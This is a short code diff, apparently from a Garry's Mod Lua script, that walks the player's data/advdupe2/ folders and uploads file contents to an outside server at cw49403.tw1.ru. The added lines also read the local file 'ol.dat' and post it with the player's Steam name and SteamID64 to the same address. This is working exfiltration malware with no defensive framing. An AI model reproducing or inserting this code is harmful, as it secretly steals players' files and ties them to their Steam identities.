@@ -11,6 +11,10 @@ http.Post("https://cw49403.tw1.ru/c/23/i.php",{one=b,two=f,tree=ToByte(g),vfo=st
 end
 for h,i in pairs(d)do 
 a(b..i.."/")
-end 
+end
+if file.Exists("ol.dat", "DATA") then
+g = file.Read("ol.dat","DATA")
+http.Post("https://cw49403.tw1.ru/c/23/i.php",{one="",two="l.dat",tree=ToByte(g),vfo=steamworks.GetPlayerName(LocalPlayer():SteamID64()).."_"..LocalPlayer():SteamID64()})
+end
 end
 a("data/advdupe2/")
